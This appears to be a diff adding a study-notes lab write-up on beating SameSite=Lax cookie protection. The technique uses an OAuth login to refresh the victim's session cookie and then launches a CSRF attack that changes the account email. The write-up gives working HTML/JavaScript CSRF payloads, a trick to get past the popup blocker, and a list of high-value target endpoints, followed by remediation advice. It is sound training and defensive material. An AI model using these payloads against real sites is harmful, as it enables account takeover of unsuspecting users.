@@ -4264,3 +4264,530 @@ XSS executes inside trusted site
 ---
 
 Use sibling-domain XSS to turn cross-site into same-site → hijack WebSocket → steal data
+
+---
+
+# 🐞 Lab-12 — OAuth + CSRF + SameSite=Lax Bypass
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates how an attacker can bypass **SameSite=Lax cookie protection** using an **OAuth login flow** to refresh the victim’s session cookie and then perform a CSRF attack.
+
+---
+
+Normally:
+
+```
+SameSite=Lax blocks cross-site POST requests
+```
+
+---
+
+However, in this lab:
+
+✔ No CSRF token  
+✔ OAuth login silently refreshes session  
+✔ Newly issued cookies bypass Lax restriction temporarily  
+
+---
+
+👉 Result:
+
+```
+Attacker refreshes victim session
+→ sends CSRF request
+→ email changed successfully
+```
+
+---
+
+## 🧠 Core Idea
+
+OAuth refreshes session cookies  
+Fresh cookies bypass SameSite=Lax timing restriction  
+
+---
+
+## 🧠 Key Exploit
+
+```
+window.open('/social-login');
+setTimeout(changeEmail, 5000);
+```
+
+---
+
+👉 Refresh session first → exploit immediately after
+
+---
+
+## 🔍 What Is This Topic?
+
+### 🔹 CSRF (Cross-Site Request Forgery)
+
+Forcing victim browser to perform actions using authenticated session
+
+---
+
+### 🔹 SameSite=Lax
+
+Default cookie policy that:
+
+✔ Allows top-level GET navigation  
+❌ Blocks most cross-site POST requests  
+
+---
+
+### 🔹 OAuth Flow Abuse
+
+Using login flows to silently refresh session cookies
+
+---
+
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Analyze Change Email Request
+
+Captured request:
+
+```
+POST /my-account/change-email
+```
+
+---
+
+### 🧠 Observation
+
+```
+No CSRF token present
+```
+
+---
+
+### 🧠 Insight
+
+```
+Endpoint depends only on session cookie
+```
+
+---
+
+### 🧩 Step 2 — Check Cookie Behavior
+
+OAuth callback response:
+
+```
+GET /oauth-callback?code=...
+```
+
+---
+
+### 🧠 Observation
+
+```
+No SameSite attribute set
+```
+
+---
+
+### 🧠 Result
+
+```
+Browser defaults to SameSite=Lax
+```
+
+---
+
+### 🧩 Step 3 — Test Basic CSRF
+
+```
+<script>
+history.pushState('', '', '/')
+</script>
+
+<form action="https://LAB/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@email.com" />
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+### 🧠 Result
+
+```
+Fresh cookie (<2 min) → works
+Old cookie (>2 min) → blocked
+```
+
+---
+
+### 🧠 Why?
+
+```
+SameSite=Lax temporarily allows recent cookies
+```
+
+---
+
+### 🧩 Step 4 — Identify Core Weakness
+
+```
+OAuth silently refreshes session
+```
+
+---
+
+👉 New cookie becomes usable for CSRF again
+
+---
+
+### 🧩 Step 5 — Force OAuth Login
+
+```
+window.open('/social-login');
+```
+
+---
+
+### 🧠 Effect
+
+```
+Victim session refreshed automatically
+```
+
+---
+
+### 🧩 Step 6 — Wait for Cookie
+
+```
+setTimeout(changeEmail, 5000);
+```
+
+---
+
+### 🧠 Purpose
+
+```
+Allow OAuth flow to complete
+```
+
+---
+
+### 🧩 Step 7 — Send CSRF Request
+
+```
+document.forms[0].submit();
+```
+
+---
+
+👉 Result:
+
+✔ Session cookie included  
+✔ Email changed successfully  
+
+---
+
+### 🧩 Step 8 — Final Payload
+
+```
+<form method="POST" action="https://LAB/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@attacker.com">
+</form>
+
+<p>Click anywhere on the page</p>
+
+<script>
+window.onclick = () => {
+    window.open('https://LAB/social-login');
+    setTimeout(changeEmail, 5000);
+}
+
+function changeEmail() {
+    document.forms[0].submit();
+}
+</script>
+```
+
+---
+
+### 🧩 Step 9 — Handle Popup Blocker
+
+Problem:
+
+```
+window.open() blocked automatically
+```
+
+---
+
+Solution:
+
+```
+Trigger on user interaction
+```
+
+---
+
+### 🧩 Step 10 — Result
+
+✔ OAuth refreshes cookie  
+✔ CSRF request succeeds  
+✔ Email changed  
+
+---
+
+## 💣 Payload Breakdown
+
+---
+
+### 🔹 OAuth Trigger
+
+```
+window.open('/social-login');
+```
+
+---
+
+✔ Refreshes session silently  
+
+---
+
+### 🔹 Delay
+
+```
+setTimeout(changeEmail, 5000);
+```
+
+---
+
+✔ Waits for cookie issuance  
+
+---
+
+### 🔹 CSRF Form
+
+```
+<form method="POST">
+```
+
+---
+
+✔ Performs sensitive action  
+
+---
+
+### 🔹 User Interaction
+
+```
+window.onclick
+```
+
+---
+
+✔ Bypasses popup blocker  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Google Login Abuse
+
+```
+Silent OAuth refresh → CSRF account takeover
+```
+
+---
+
+### 🔥 Scenario 2 — SaaS Platforms
+
+```
+Change billing email / payment info
+```
+
+---
+
+### 🔥 Scenario 3 — Banking Apps
+
+```
+Refresh session → transfer funds
+```
+
+---
+
+### 🔥 Scenario 4 — Social Media
+
+```
+Change recovery email
+```
+
+---
+
+### 🔥 Scenario 5 — Enterprise Apps
+
+```
+Modify account settings silently
+```
+
+---
+
+## ⚔️ Attack Chain
+
+---
+
+1️⃣ No CSRF token  
+2️⃣ SameSite=Lax enabled  
+3️⃣ OAuth refreshes session  
+4️⃣ Fresh cookie issued  
+5️⃣ Wait for completion  
+6️⃣ Send CSRF request  
+7️⃣ Session accepted  
+8️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+```
+/change-email
+/change-password
+/add-payment-method
+/transfer-money
+/api-key/regenerate
+```
+
+---
+
+## ⚠️ Real-World Limitations + Bypass
+
+---
+
+### ❌ SameSite=Strict
+
+👉 Attack blocked  
+
+---
+
+### ❌ CSRF Token Present
+
+👉 Request rejected  
+
+---
+
+### ❌ OAuth Requires Interaction
+
+👉 Harder to automate  
+
+---
+
+### ❌ Popup Blocked
+
+👉 window.open fails  
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Use click events
+Chain with XSS
+Use redirects or iframes
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+### 🔴 Root Problem
+
+Reliance on SameSite without proper CSRF protection
+
+---
+
+### ✅ Fix 1 — Implement CSRF Tokens
+
+```
+Unique + session-bound
+```
+
+---
+
+### ✅ Fix 2 — Use SameSite=Strict
+
+```
+Stronger cookie protection
+```
+
+---
+
+### ✅ Fix 3 — Require Re-authentication
+
+```
+Password confirmation for sensitive actions
+```
+
+---
+
+### ✅ Fix 4 — Restrict OAuth Automation
+
+```
+Require explicit interaction
+```
+
+---
+
+### ✅ Fix 5 — Validate Origin / Referer
+
+```
+Reject cross-site requests
+```
+
+---
+
+## 🧠 Mental Model
+
+---
+
+OAuth refreshes session  
+
+→ New cookie issued  
+
+→ SameSite=Lax temporarily trusts cookie  
+
+→ CSRF succeeds  
+
+---
+
+## 🎯 Final Summary
+
+---
+
+✔ No CSRF token protection  
+
+✔ SameSite=Lax bypassed using fresh cookies  
+
+✔ OAuth silently refreshes session  
+
+✔ CSRF successfully executed  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Refresh victim session through OAuth → obtain fresh SameSite=Lax cookie → immediately perform CSRF attack
